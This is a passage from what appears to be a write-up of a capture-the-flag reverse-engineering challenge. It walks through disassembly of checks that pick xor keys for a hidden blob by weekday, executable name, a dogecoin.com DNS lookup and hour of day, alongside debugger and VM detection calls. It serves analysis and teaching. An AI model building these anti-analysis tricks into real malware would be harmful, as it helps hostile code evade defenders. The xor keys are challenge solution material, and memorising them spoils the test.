    <table class="highlighttable"><tr><td><div class="linenodiv" style="background-color: #f0f0f0; padding-right: 10px"><pre style="line-height: 125%"> 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11</pre></div></td><td class="code"><div class="highlight" style="background: #002B36"><pre style="line-height: 125%"><span style="color: #586E75">// each field is an int (4 bytes)</span>

<span style="color: #93A1A1">tm_sec:</span>     <span style="color: #93A1A1">Seconds</span> <span style="color: #93A1A1">after</span> <span style="color: #93A1A1">minute</span> <span style="color: #93A1A1">(</span><span style="color: #2AA198">0</span> <span style="color: #93A1A1">–</span> <span style="color: #2AA198">59</span><span style="color: #93A1A1">)</span>
<span style="color: #93A1A1">tm_min:</span>     <span style="color: #93A1A1">Minutes</span> <span style="color: #93A1A1">after</span> <span style="color: #93A1A1">hour</span> <span style="color: #93A1A1">(</span><span style="color: #2AA198">0</span> <span style="color: #93A1A1">–</span> <span style="color: #2AA198">59</span><span style="color: #93A1A1">)</span>
<span style="color: #93A1A1">tm_hour:</span>    <span style="color: #93A1A1">Hours</span> <span style="color: #93A1A1">after</span> <span style="color: #93A1A1">midnight</span> <span style="color: #93A1A1">(</span><span style="color: #2AA198">0</span> <span style="color: #93A1A1">–</span> <span style="color: #2AA198">23</span><span style="color: #93A1A1">)</span>
<span style="color: #93A1A1">tm_mday:</span>    <span style="color: #93A1A1">Day</span> <span style="color: #93A1A1">of</span> <span style="color: #93A1A1">month</span> <span style="color: #93A1A1">(</span><span style="color: #2AA198">1</span> <span style="color: #93A1A1">–</span> <span style="color: #2AA198">31</span><span style="color: #93A1A1">)</span>
<span style="color: #93A1A1">tm_mon:</span>     <span style="color: #93A1A1">Month</span> <span style="color: #93A1A1">(</span><span style="color: #2AA198">0</span> <span style="color: #93A1A1">–</span> <span style="color: #2AA198">11</span><span style="color: #93A1A1">;</span> <span style="color: #93A1A1">January</span> <span style="color: #719e07">=</span> <span style="color: #2AA198">0</span><span style="color: #93A1A1">)</span>
<span style="color: #93A1A1">tm_year:</span>    <span style="color: #93A1A1">Year</span> <span style="color: #93A1A1">(current</span> <span style="color: #93A1A1">year</span> <span style="color: #93A1A1">minus</span> <span style="color: #2AA198">1900</span><span style="color: #93A1A1">)</span>
<span style="color: #93A1A1">tm_wday:</span>    <span style="color: #93A1A1">Day</span> <span style="color: #93A1A1">of</span> <span style="color: #93A1A1">week</span> <span style="color: #93A1A1">(</span><span style="color: #2AA198">0</span> <span style="color: #93A1A1">–</span> <span style="color: #2AA198">6</span><span style="color: #93A1A1">;</span> <span style="color: #93A1A1">Sunday</span> <span style="color: #719e07">=</span> <span style="color: #2AA198">0</span><span style="color: #93A1A1">)</span> <span style="color: #719e07">:</span> <span style="color: #93A1A1">offset:</span> <span style="color: #2AA198">24</span>
<span style="color: #93A1A1">tm_yday:</span>    <span style="color: #93A1A1">Day</span> <span style="color: #93A1A1">of</span> <span style="color: #93A1A1">year</span> <span style="color: #93A1A1">(</span><span style="color: #2AA198">0</span> <span style="color: #93A1A1">–</span> <span style="color: #2AA198">365</span><span style="color: #93A1A1">;</span> <span style="color: #93A1A1">January</span> <span style="color: #2AA198">1</span> <span style="color: #719e07">=</span> <span style="color: #2AA198">0</span><span style="color: #93A1A1">)</span>
<span style="color: #93A1A1">tm_isdst:</span>   <span style="color: #93A1A1">Positive</span> <span style="color: #93A1A1">value</span> <span style="color: #719e07">if</span> <span style="color: #93A1A1">daylight</span> <span style="color: #93A1A1">saving</span> <span style="color: #93A1A1">time</span> <span style="color: #93A1A1">is</span> <span style="color: #93A1A1">in</span> <span style="color: #93A1A1">effect;</span> <span style="color: #2AA198">0</span> <span style="color: #719e07">if</span> <span style="color: #93A1A1">daylight</span> <span style="color: #93A1A1">saving</span> <span style="color: #93A1A1">time</span> <span style="color: #93A1A1">is</span> <span style="color: #93A1A1">not</span> <span style="color: #93A1A1">in</span> <span style="color: #93A1A1">effect;</span> <span style="color: #93A1A1">negative</span> <span style="color: #93A1A1">value</span> <span style="color: #719e07">if</span> <span style="color: #93A1A1">status</span> <span style="color: #93A1A1">of</span> <span style="color: #93A1A1">daylight</span> <span style="color: #93A1A1">saving</span> <span style="color: #93A1A1">time</span> <span style="color: #93A1A1">is</span> <span style="color: #93A1A1">unknown</span>
</pre></div>
</td></tr></table>
  </div>
</figure>
</p>

<p>Next instruction <code>cmp dword ptr [eax+18h], 5</code> compares 24th (0x16) byte of the structure with 5. Because each field is of type <code>int</code> and 4 bytes, 24th byte will be the current day of the week. Sunday is 0, so Friday is 5. The application simply checks if it is Friday. If so, it will xor <code>! 50 1337</code> with the blob and if it is not Friday blob will be xor-ed with <code>1337</code>.</p>

<p>


    

<figure class="code">
  <figcaption>
  	<span>Day of the week check</span>
  </figcaption>
  <div class="codewrapper"> 
    <table class="highlighttable"><tr><td><div class="linenodiv" style="background-color: #f0f0f0; padding-right: 10px"><pre style="line-height: 125%">1
2
3
4</pre></div></td><td class="code"><div class="highlight" style="background: #002B36"><pre style="line-height: 125%"><span style="color: #719e07">if</span> <span style="color: #93A1A1">(Friday):</span>
    <span style="color: #93A1A1">blob</span> <span style="color: #719e07">=</span> <span style="color: #93A1A1">xor(blob,</span><span style="color: #2AA198">&quot;! 50 1337&quot;</span><span style="color: #93A1A1">)</span>
<span style="color: #719e07">else</span><span style="color: #93A1A1">:</span>
    <span style="color: #93A1A1">blob</span> <span style="color: #719e07">=</span> <span style="color: #93A1A1">xor(blob,</span><span style="color: #2AA198">&quot;1337&quot;</span><span style="color: #93A1A1">)</span>
</pre></div>
</td></tr></table>
  </div>
</figure>
</p>

<h4 id="function-9-backdoge-exe:94bf06dd1bee42f6b34a1ff79274f7e7">Function 9 - Backdoge.exe</h4>

<p>


    

<figure class="code">
  <figcaption>
  	<span></span>
  </figcaption>
  <div class="codewrapper"> 
    <table class="highlighttable"><tr><td><div class="linenodiv" style="background-color: #f0f0f0; padding-right: 10px"><pre style="line-height: 125%"> 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12</pre></div></td><td class="code"><div class="highlight" style="background: #002B36"><pre style="line-height: 125%"><span style="color: #93A1A1">.text:00401</span><span style="color: #268BD2">B13</span> <span style="color: #268BD2">call</span>    <span style="color: #268BD2">isDebuggerPresent</span>
<span style="color: #93A1A1">.text:00401</span><span style="color: #268BD2">B18</span> <span style="color: #268BD2">call</span>    <span style="color: #268BD2">BeingDebugged</span>
<span style="color: #93A1A1">.text:00401</span><span style="color: #268BD2">B1D</span> <span style="color: #268BD2">call</span>    <span style="color: #268BD2">VMware_detection</span>
<span style="color: #93A1A1">.text:00401</span><span style="color: #268BD2">B22</span> <span style="color: #268BD2">call</span>    <span style="color: #268BD2">Electric_Boogaloo</span>
<span style="color: #93A1A1">.text:00401</span><span style="color: #268BD2">B27</span> <span style="color: #268BD2">call</span>    <span style="color: #268BD2">OutputDebugString</span>
<span style="color: #93A1A1">.text:00401</span><span style="color: #268BD2">B2C</span> <span style="color: #268BD2">call</span>    <span style="color: #268BD2">ICanHaz?</span>
<span style="color: #93A1A1">.text:00401</span><span style="color: #268BD2">B31</span> <span style="color: #268BD2">call</span>    <span style="color: #268BD2">NtGlobalFlag</span>
<span style="color: #93A1A1">.text:00401</span><span style="color: #268BD2">B36</span> <span style="color: #268BD2">call</span>    <span style="color: #268BD2">SandsOfTime</span>
<span style="color: #93A1A1">.text:00401</span><span style="color: #268BD2">B3B</span> <span style="color: #268BD2">mov</span>     <span style="color: #B58900">eax</span><span style="color: #93A1A1">,</span> <span style="color: #93A1A1">[</span><span style="color: #B58900">esi</span><span style="color: #93A1A1">]</span>   <span style="color: #586E75">; eax = executable&#39;s name</span>
<span style="color: #93A1A1">.text:00401</span><span style="color: #268BD2">B3D</span> <span style="color: #268BD2">call</span>    <span style="color: #268BD2">sub_4014F0</span>   <span style="color: #586E75">; you are here</span>
<span style="color: #93A1A1">.text:00401</span><span style="color: #268BD2">B42</span> <span style="color: #268BD2">call</span>    <span style="color: #268BD2">sub_401590</span>
<span style="color: #93A1A1">.text:00401</span><span style="color: #268BD2">B47</span> <span style="color: #268BD2">call</span>    <span style="color: #268BD2">sub_4016F0</span>
</pre></div>
</td></tr></table>
  </div>
</figure>
</p>

<p>Before next function, executable&rsquo;s complete path is saved into <code>eax</code>. Then <code>sub_4014F0</code> is called.</p>

<p><img src="/images/2014/flare/7-14.jpg" alt="Comparing executable's name with backdoge.exe" title="Comparing executable's name with backdoge.exe" /></p>

<p>Again, this is just a check. Executable&rsquo;s name is compared with <code>backdoge.exe</code> two characters in each iteration.</p>

<p><img src="/images/2014/flare/7-15.jpg" alt="Filename check" title="Filename check" /></p>

<p>The rest is pretty easy. If filename check passes, <code>MATH IS HARD</code> will be xor-ed with the blob and if not <code>LETS GO SHOPPING</code>.</p>

<p>


    

<figure class="code">
  <figcaption>
  	<span>Filename check</span>
  </figcaption>
  <div class="codewrapper"> 
    <table class="highlighttable"><tr><td><div class="linenodiv" style="background-color: #f0f0f0; padding-right: 10px"><pre style="line-height: 125%">1
2
3
4</pre></div></td><td class="code"><div class="highlight" style="background: #002B36"><pre style="line-height: 125%"><span style="color: #719e07">if</span> <span style="color: #93A1A1">(filename</span> <span style="color: #719e07">==</span> <span style="color: #2AA198">&quot;BackDoge.exe&quot;</span><span style="color: #93A1A1">):</span>
    <span style="color: #93A1A1">blob</span> <span style="color: #719e07">=</span> <span style="color: #93A1A1">xor(blob,</span><span style="color: #2AA198">&quot;MATH IS HARD&quot;</span><span style="color: #93A1A1">)</span>
<span style="color: #719e07">else</span><span style="color: #93A1A1">:</span>
    <span style="color: #93A1A1">blob</span> <span style="color: #719e07">=</span> <span style="color: #93A1A1">xor(blob,</span><span style="color: #2AA198">&quot;LETS GO SHOPPING&quot;</span><span style="color: #93A1A1">)</span>
</pre></div>
</td></tr></table>
  </div>
</figure>
</p>

<h4 id="function-10-dogecoin-com-ip-check:94bf06dd1bee42f6b34a1ff79274f7e7">Function 10 - Dogecoin.com IP Check</h4>

<p>


    

<figure class="code">
  <figcaption>
  	<span></span>
  </figcaption>
  <div class="codewrapper"> 
    <table class="highlighttable"><tr><td><div class="linenodiv" style="background-color: #f0f0f0; padding-right: 10px"><pre style="line-height: 125%"> 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12</pre></div></td><td class="code"><div class="highlight" style="background: #002B36"><pre style="line-height: 125%"><span style="color: #93A1A1">.text:00401</span><span style="color: #268BD2">B13</span> <span style="color: #268BD2">call</span>    <span style="color: #268BD2">isDebuggerPresent</span>
<span style="color: #93A1A1">.text:00401</span><span style="color: #268BD2">B18</span> <span style="color: #268BD2">call</span>    <span style="color: #268BD2">BeingDebugged</span>
<span style="color: #93A1A1">.text:00401</span><span style="color: #268BD2">B1D</span> <span style="color: #268BD2">call</span>    <span style="color: #268BD2">VMware_detection</span>
<span style="color: #93A1A1">.text:00401</span><span style="color: #268BD2">B22</span> <span style="color: #268BD2">call</span>    <span style="color: #268BD2">Electric_Boogaloo</span>
<span style="color: #93A1A1">.text:00401</span><span style="color: #268BD2">B27</span> <span style="color: #268BD2">call</span>    <span style="color: #268BD2">OutputDebugString</span>
<span style="color: #93A1A1">.text:00401</span><span style="color: #268BD2">B2C</span> <span style="color: #268BD2">call</span>    <span style="color: #268BD2">ICanHaz?</span>
<span style="color: #93A1A1">.text:00401</span><span style="color: #268BD2">B31</span> <span style="color: #268BD2">call</span>    <span style="color: #268BD2">NtGlobalFlag</span>
<span style="color: #93A1A1">.text:00401</span><span style="color: #268BD2">B36</span> <span style="color: #268BD2">call</span>    <span style="color: #268BD2">SandsOfTime</span>
<span style="color: #93A1A1">.text:00401</span><span style="color: #268BD2">B3B</span> <span style="color: #268BD2">mov</span>     <span style="color: #B58900">eax</span><span style="color: #93A1A1">,</span> <span style="color: #93A1A1">[</span><span style="color: #B58900">esi</span><span style="color: #93A1A1">]</span>
<span style="color: #93A1A1">.text:00401</span><span style="color: #268BD2">B3D</span> <span style="color: #268BD2">call</span>    <span style="color: #268BD2">BackDoge</span>
<span style="color: #93A1A1">.text:00401</span><span style="color: #268BD2">B42</span> <span style="color: #268BD2">call</span>    <span style="color: #268BD2">sub_401590</span>   <span style="color: #586E75">; you are here</span>
<span style="color: #93A1A1">.text:00401</span><span style="color: #268BD2">B47</span> <span style="color: #268BD2">call</span>    <span style="color: #268BD2">sub_4016F0</span>
</pre></div>
</td></tr></table>
  </div>
</figure>
</p>

<p>Another check. This time the application retrieves the IP for <code>www.dogecoin.com</code> using <a href="http://msdn.microsoft.com/en-us/library/windows/desktop/ms738524%28v=vs.85%29.aspx" target="_blank">gethostbyname</a>. The result is of the form <a href="http://msdn.microsoft.com/en-us/library/windows/desktop/ms738552%28v=vs.85%29.aspx" target="_blank">hostent</a>:</p>

<p>


    

<figure class="code">
  <figcaption>
  	<span>hostent structure (for Win32)</span>
  </figcaption>
  <div class="codewrapper"> 
    <table class="highlighttable"><tr><td><div class="linenodiv" style="background-color: #f0f0f0; padding-right: 10px"><pre style="line-height: 125%">1
2
3
4
5
6
7</pre></div></td><td class="code"><div class="highlight" style="background: #002B36"><pre style="line-height: 125%"><span style="color: #719e07">typedef</span> <span style="color: #719e07">struct</span> <span style="color: #93A1A1">hostent</span> <span style="color: #93A1A1">{</span>
  <span style="color: #DC322F">char</span> <span style="color: #93A1A1">FAR</span>      <span style="color: #719e07">*</span><span style="color: #93A1A1">h_name;</span>        <span style="color: #586E75">// index: 0</span>
  <span style="color: #DC322F">char</span> <span style="color: #93A1A1">FAR</span>  <span style="color: #93A1A1">FAR</span> <span style="color: #719e07">**</span><span style="color: #93A1A1">h_aliases;</span>    <span style="color: #586E75">// index: 4 </span>
  <span style="color: #DC322F">short</span>         <span style="color: #93A1A1">h_addrtype;</span>     <span style="color: #586E75">// index: 8</span>
  <span style="color: #DC322F">short</span>         <span style="color: #93A1A1">h_length;</span>       <span style="color: #586E75">// index: 9</span>
  <span style="color: #DC322F">char</span> <span style="color: #93A1A1">FAR</span>  <span style="color: #93A1A1">FAR</span> <span style="color: #719e07">**</span><span style="color: #93A1A1">h_addr_list;</span>
<span style="color: #93A1A1">}</span> <span style="color: #93A1A1">HOSTENT,</span> <span style="color: #719e07">*</span><span style="color: #93A1A1">PHOSTENT,</span> <span style="color: #93A1A1">FAR</span> <span style="color: #719e07">*</span><span style="color: #93A1A1">LPHOSTENT;</span>
</pre></div>
</td></tr></table>
  </div>
</figure>
</p>

<p><img src="/images/2014/flare/7-16.jpg" alt="Dogecoin.com IP" title="Dogecoin.com IP" /></p>

<p>Then 8th byte will be compared with <code>2</code> which is <code>h_addrtype</code>. According to this <a href="http://stackoverflow.com/q/2549461" target="_blank">stackoverflow answer</a>, it is <code>AF_INET</code> or <code>PF_INET</code> defined in <a href="http://repo-genesis3.cbi.utsa.edu/crossref/ns-sli/usr/include/bits/socket.h.html" target="_blank">bits/socket.h</a>.</p>

<p><code>inet_ntoa</code> is converting the IP to ASCII IPv4 format (e.g. 192.168.0.1) and comparing it to <code>127.0.0.1</code> two characters at a time like last check.</p>

<p><img src="/images/2014/flare/7-17.jpg" alt="xor paths for ip check" title="xor paths for ip check" /></p>

<p>The xor-string is <code>LETS GO MATH</code> if the resolved IP address is not <code>127.0.0.1</code>. If the IP address is <code>127.0.0.1</code> or <code>h_addrtype</code> is not <code>2</code> then <code>SHOPPING IS HARD</code> will be xor-ed with the blob.</p>

<p>


    

<figure class="code">
  <figcaption>
  	<span>Dogecoin.com IP check</span>
  </figcaption>
  <div class="codewrapper"> 
    <table class="highlighttable"><tr><td><div class="linenodiv" style="background-color: #f0f0f0; padding-right: 10px"><pre style="line-height: 125%">1
2
3
4</pre></div></td><td class="code"><div class="highlight" style="background: #002B36"><pre style="line-height: 125%"><span style="color: #719e07">if</span> <span style="color: #93A1A1">(h_addrtype</span> <span style="color: #719e07">!=</span> <span style="color: #2AA198">2</span> <span style="color: #719e07">or</span> <span style="color: #93A1A1">(Dogecoin_ip</span> <span style="color: #719e07">==</span> <span style="color: #2AA198">&quot;127.0.0.1&quot;</span><span style="color: #93A1A1">)):</span>
    <span style="color: #93A1A1">blob</span> <span style="color: #719e07">=</span> <span style="color: #93A1A1">xor(blob,</span><span style="color: #2AA198">&quot;SHOPPING IS HARD&quot;</span><span style="color: #93A1A1">)</span>
<span style="color: #719e07">if</span> <span style="color: #93A1A1">(Dogecoin_ip</span> <span style="color: #719e07">!=</span> <span style="color: #2AA198">&quot;127.0.0.1&quot;</span><span style="color: #93A1A1">):</span>
    <span style="color: #93A1A1">blob</span> <span style="color: #719e07">=</span> <span style="color: #93A1A1">xor(blob,</span><span style="color: #2AA198">&quot;LETS GO MATH&quot;</span><span style="color: #93A1A1">)</span>
</pre></div>
</td></tr></table>
  </div>
</figure>
</p>

<h4 id="function-11-hour-of-the-wolf:94bf06dd1bee42f6b34a1ff79274f7e7">Function 11 - Hour of the Wolf</h4>

<p>


    

<figure class="code">
  <figcaption>
  	<span></span>
  </figcaption>
  <div class="codewrapper"> 
    <table class="highlighttable"><tr><td><div class="linenodiv" style="background-color: #f0f0f0; padding-right: 10px"><pre style="line-height: 125%"> 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12</pre></div></td><td class="code"><div class="highlight" style="background: #002B36"><pre style="line-height: 125%"><span style="color: #93A1A1">.text:00401</span><span style="color: #268BD2">B13</span> <span style="color: #268BD2">call</span>    <span style="color: #268BD2">isDebuggerPresent</span>
<span style="color: #93A1A1">.text:00401</span><span style="color: #268BD2">B18</span> <span style="color: #268BD2">call</span>    <span style="color: #268BD2">BeingDebugged</span>
<span style="color: #93A1A1">.text:00401</span><span style="color: #268BD2">B1D</span> <span style="color: #268BD2">call</span>    <span style="color: #268BD2">VMware_detection</span>
<span style="color: #93A1A1">.text:00401</span><span style="color: #268BD2">B22</span> <span style="color: #268BD2">call</span>    <span style="color: #268BD2">Electric_Boogaloo</span>
<span style="color: #93A1A1">.text:00401</span><span style="color: #268BD2">B27</span> <span style="color: #268BD2">call</span>    <span style="color: #268BD2">OutputDebugString</span>
<span style="color: #93A1A1">.text:00401</span><span style="color: #268BD2">B2C</span> <span style="color: #268BD2">call</span>    <span style="color: #268BD2">ICanHaz?</span>
<span style="color: #93A1A1">.text:00401</span><span style="color: #268BD2">B31</span> <span style="color: #268BD2">call</span>    <span style="color: #268BD2">NtGlobalFlag</span>
<span style="color: #93A1A1">.text:00401</span><span style="color: #268BD2">B36</span> <span style="color: #268BD2">call</span>    <span style="color: #268BD2">SandsOfTime</span>
<span style="color: #93A1A1">.text:00401</span><span style="color: #268BD2">B3B</span> <span style="color: #268BD2">mov</span>     <span style="color: #B58900">eax</span><span style="color: #93A1A1">,</span> <span style="color: #93A1A1">[</span><span style="color: #B58900">esi</span><span style="color: #93A1A1">]</span>
<span style="color: #93A1A1">.text:00401</span><span style="color: #268BD2">B3D</span> <span style="color: #268BD2">call</span>    <span style="color: #268BD2">BackDoge</span>
<span style="color: #93A1A1">.text:00401</span><span style="color: #268BD2">B42</span> <span style="color: #268BD2">call</span>    <span style="color: #268BD2">IPCheck</span>
<span style="color: #93A1A1">.text:00401</span><span style="color: #268BD2">B47</span> <span style="color: #268BD2">call</span>    <span style="color: #268BD2">sub_4016F0</span>   <span style="color: #586E75">; you are here</span>
</pre></div>
</td></tr></table>
  </div>
</figure>
</p>

<p><img src="/images/2014/flare/7-18.jpg" alt="Hour check" title="Hour check" /></p>

<p>Again, we see the familiar <code>time64</code> and <code>localtime64</code> calls. This time offset 8 of the <code>tm</code> structure (copied below) is compared with <code>0x11</code> or <code>17</code>. This offset contains the number of hours after midnight, so the application is checking if it is between 5 and 6 PM.</p>

<p>


    

<figure class="code">
  <figcaption>
  	<span>tm</span>
  </figcaption>
  <div class="codewrapper"> 
    <table class="highlighttable"><tr><td><div class="linenodiv" style="background-color: #f0f0f0; padding-right: 10px"><pre style="line-height: 125%"> 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11</pre></div></td><td class="code"><div class="highlight" style="background: #002B36"><pre style="line-height: 125%"><span style="color: #586E75">// each field is an int (4 bytes)</span>

<span style="color: #93A1A1">tm_sec:</span>     <span style="color: #93A1A1">Seconds</span> <span style="color: #93A1A1">after</span> <span style="color: #93A1A1">minute</span> <span style="color: #93A1A1">(</span><span style="color: #2AA198">0</span> <span style="color: #93A1A1">–</span> <span style="color: #2AA198">59</span><span style="color: #93A1A1">).</span>  <span style="color: #93A1A1">;</span> <span style="color: #93A1A1">index:</span> <span style="color: #2AA198">0</span>
<span style="color: #93A1A1">tm_min:</span>     <span style="color: #93A1A1">Minutes</span> <span style="color: #93A1A1">after</span> <span style="color: #93A1A1">hour</span> <span style="color: #93A1A1">(</span><span style="color: #2AA198">0</span> <span style="color: #93A1A1">–</span> <span style="color: #2AA198">59</span><span style="color: #93A1A1">).</span>    <span style="color: #93A1A1">;</span> <span style="color: #93A1A1">index:</span> <span style="color: #2AA198">4</span>
<span style="color: #93A1A1">tm_hour:</span>    <span style="color: #93A1A1">Hours</span> <span style="color: #93A1A1">after</span> <span style="color: #93A1A1">midnight</span> <span style="color: #93A1A1">(</span><span style="color: #2AA198">0</span> <span style="color: #93A1A1">–</span> <span style="color: #2AA198">23</span><span style="color: #93A1A1">).</span>  <span style="color: #93A1A1">;</span> <span style="color: #93A1A1">index:</span> <span style="color: #2AA198">8</span>
<span style="color: #93A1A1">tm_mday:</span>    <span style="color: #93A1A1">Day</span> <span style="color: #93A1A1">of</span> <span style="color: #93A1A1">month</span> <span style="color: #93A1A1">(</span><span style="color: #2AA198">1</span> <span style="color: #93A1A1">–</span> <span style="color: #2AA198">31</span><span style="color: #93A1A1">).</span>
<span style="color: #93A1A1">tm_mon:</span>     <span style="color: #93A1A1">Month</span> <span style="color: #93A1A1">(</span><span style="color: #2AA198">0</span> <span style="color: #93A1A1">–</span> <span style="color: #2AA198">11</span><span style="color: #93A1A1">;</span> <span style="color: #93A1A1">January</span> <span style="color: #719e07">=</span> <span style="color: #2AA198">0</span><span style="color: #93A1A1">).</span>
<span style="color: #93A1A1">tm_year:</span>    <span style="color: #93A1A1">Year</span> <span style="color: #93A1A1">(current</span> <span style="color: #93A1A1">year</span> <span style="color: #93A1A1">minus</span> <span style="color: #2AA198">1900</span><span style="color: #93A1A1">).</span>
<span style="color: #93A1A1">tm_wday:</span>    <span style="color: #93A1A1">Day</span> <span style="color: #93A1A1">of</span> <span style="color: #93A1A1">week</span> <span style="color: #93A1A1">(</span><span style="color: #2AA198">0</span> <span style="color: #93A1A1">–</span> <span style="color: #2AA198">6</span><span style="color: #93A1A1">;</span> <span style="color: #93A1A1">Sunday</span> <span style="color: #719e07">=</span> <span style="color: #2AA198">0</span><span style="color: #93A1A1">).</span>
<span style="color: #93A1A1">tm_yday:</span>    <span style="color: #93A1A1">Day</span> <span style="color: #93A1A1">of</span> <span style="color: #93A1A1">year</span> <span style="color: #93A1A1">(</span><span style="color: #2AA198">0</span> <span style="color: #93A1A1">–</span> <span style="color: #2AA198">365</span><span style="color: #93A1A1">;</span> <span style="color: #93A1A1">January</span> <span style="color: #2AA198">1</span> <span style="color: #719e07">=</span> <span style="color: #2AA198">0</span><span style="color: #93A1A1">).</span>
<span style="color: #93A1A1">tm_isdst:</span>   <span style="color: #93A1A1">Positive</span> <span style="color: #93A1A1">value</span> <span style="color: #719e07">if</span> <span style="color: #93A1A1">daylight</span> <span style="color: #93A1A1">saving</span> <span style="color: #93A1A1">time</span> <span style="color: #93A1A1">is</span> <span style="color: #93A1A1">in</span> <span style="color: #93A1A1">effect;</span> <span style="color: #2AA198">0</span> <span style="color: #719e07">if</span> <span style="color: #93A1A1">daylight</span> <span style="color: #93A1A1">saving</span> <span style="color: #93A1A1">time</span> <span style="color: #93A1A1">is</span> <span style="color: #93A1A1">not</span> <span style="color: #93A1A1">in</span> <span style="color: #93A1A1">effect;</span> <span style="color: #93A1A1">negative</span> <span style="color: #93A1A1">value</span> <span style="color: #719e07">if</span> <span style="color: #93A1A1">status</span> <span style="color: #93A1A1">of</span> <span style="color: #93A1A1">daylight</span> <span style="color: #93A1A1">saving</span> <span style="color: #93A1A1">time</span> <span style="color: #93A1A1">is</span> <span style="color: #93A1A1">unknown.</span>
</pre></div>
</td></tr></table>
  </div>
</figure>
</p>

<p>If time check passes, blob is xor-ed with <code>\x01\x02\x03\x05\x00\x78\x30\x38\x0d</code> otherwise it will be xor-ed with <code>\x07\x77</code>.</p>

<p>


    

<figure class="code">
  <figcaption>
  	<span>Hour check</span>
  </figcaption>
  <div class="codewrapper"> 
    <table class="highlighttable"><tr><td><div class="linenodiv" style="background-color: #f0f0f0; padding-right: 10px"><pre style="line-height: 125%">1
2
3
4</pre></div></td><td class="code"><div class="highlight" style="background: #002B36"><pre style="line-height: 125%"><span style="color: #719e07">if</span> <span style="color: #93A1A1">(Hour</span> <span style="color: #719e07">==</span> <span style="color: #2AA198">17</span><span style="color: #93A1A1">)):</span>   <span style="color: #586E75"># Between 5 and 6 PM</span>
    <span style="color: #93A1A1">blob</span> <span style="color: #719e07">=</span> <span style="color: #93A1A1">xor(blob,</span><span style="color: #2AA198">&quot;</span><span style="color: #CB4B16">\x01\x02\x03\x05\x00\x78\x30\x38\x0d</span><span style="color: #2AA198">&quot;</span><span style="color: #93A1A1">)</span>
<span style="color: #719e07">else</span><span style="color: #93A1A1">:</span>
    <span style="color: #93A1A1">blob</span> <span style="color: #719e07">=</span> <span style="color: #93A1A1">xor(blob,</span><span style="color: #2AA198">&quot;</span><span style="color: #CB4B16">\x07\x77</span><span style="color: #2AA198">&quot;</span><span style="color: #93A1A1">)</span>
</pre></div>
</td></tr></table>
  </div>
</figure>
</p>

<h4 id="interlude-12-fullpath-xor:94bf06dd1bee42f6b34a1ff79274f7e7">Interlude - 12 - Fullpath xor</h4>

<p>


    

<figure class="code">
  <figcaption>
  	<span></span>
  </figcaption>
  <div class="codewrapper"> 
    <table class="highlighttable"><tr><td><div class="linenodiv" style="background-color: #f0f0f0; padding-right: 10px"><pre style="line-height: 125%"> 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28</pre></div></td><td class="code"><div class="highlight" style="background: #002B36"><pre style="line-height: 125%"><span style="color: #93A1A1">.text:00401</span><span style="color: #268BD2">B3D</span> <span style="color: #268BD2">call</span>    <span style="color: #268BD2">BackDoge</span>
<span style="color: #93A1A1">.text:00401</span><span style="color: #268BD2">B42</span> <span style="color: #268BD2">call</span>    <span style="color: #268BD2">IPCheck</span>
<span style="color: #93A1A1">.text:00401</span><span style="color: #268BD2">B47</span> <span style="color: #268BD2">call</span>    <span style="color: #268BD2">HourCheck</span>
<span style="color: #93A1A1">.text:00401</span><span style="color: #268BD2">B4C</span> <span style="color: #268BD2">mov</span>     <span style="color: #B58900">ebx</span><span style="color: #93A1A1">,</span> <span style="color: #B58900">bl</span><span style="color: #268BD2">ob_length</span> <span style="color: #586E75">; you are here</span>
<span style="color: #93A1A1">.text:00401</span><span style="color: #268BD2">B52</span> <span style="color: #268BD2">mov</span>     <span style="color: #B58900">edi</span><span style="color: #93A1A1">,</span> <span style="color: #93A1A1">[</span><span style="color: #B58900">esi</span><span style="color: #93A1A1">]</span>
<span style="color: #93A1A1">.text:00401</span><span style="color: #268BD2">B54</span> <span style="color: #268BD2">xor</span>     <span style="color: #B58900">ecx</span><span style="color: #93A1A1">,</span> <span style="color: #B58900">ecx</span>
<span style="color: #93A1A1">.text:00401</span><span style="color: #268BD2">B56</span> <span style="color: #268BD2">test</span>    <span style="color: #B58900">ebx</span><span style="color: #93A1A1">,</span> <span style="color: #B58900">ebx</span>
<span style="color: #93A1A1">.text:00401</span><span style="color: #268BD2">B58</span> <span style="color: #268BD2">jz</span>      <span style="color: #268BD2">short</span> <span style="color: #268BD2">loc_401B83</span>
<span style="color: #93A1A1">.text:00401</span><span style="color: #268BD2">B5A</span> <span style="color: #268BD2">lea</span>     <span style="color: #B58900">ebx</span><span style="color: #93A1A1">,</span> <span style="color: #93A1A1">[</span><span style="color: #B58900">ebx</span><span style="color: #719e07">+</span><span style="color: #2AA198">0</span><span style="color: #93A1A1">]</span>
<span style="color: #93A1A1">.text:00401</span><span style="color: #268BD2">B60</span>
<span style="color: #93A1A1">.text:00401</span><span style="color: #268BD2">B60</span> <span style="color: #268BD2">loc_401B60</span><span style="color: #93A1A1">:</span>                             <span style="color: #586E75">; CODE XREF: .text:00401B81j</span>
<span style="color: #93A1A1">.text:00401</span><span style="color: #268BD2">B60</span> <span style="color: #268BD2">mov</span>     <span style="color: #B58900">eax</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">0AAAAAAABh</span>
<span style="color: #93A1A1">.text:00401</span><span style="color: #268BD2">B65</span> <span style="color: #268BD2">mul</span>     <span style="color: #B58900">ecx</span>
<span style="color: #93A1A1">.text:00401</span><span style="color: #268BD2">B67</span> <span style="color: #268BD2">shr</span>     <span style="color: #B58900">edx</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">3</span>
<span style="color: #93A1A1">.text:00401</span><span style="color: #268BD2">B6A</span> <span style="color: #268BD2">lea</span>     <span style="color: #B58900">eax</span><span style="color: #93A1A1">,</span> <span style="color: #93A1A1">[</span><span style="color: #B58900">edx</span><span style="color: #719e07">+</span><span style="color: #B58900">edx</span><span style="color: #719e07">*</span><span style="color: #2AA198">2</span><span style="color: #93A1A1">]</span>
<span style="color: #93A1A1">.text:00401</span><span style="color: #268BD2">B6D</span> <span style="color: #268BD2">add</span>     <span style="color: #B58900">eax</span><span style="color: #93A1A1">,</span> <span style="color: #B58900">eax</span>
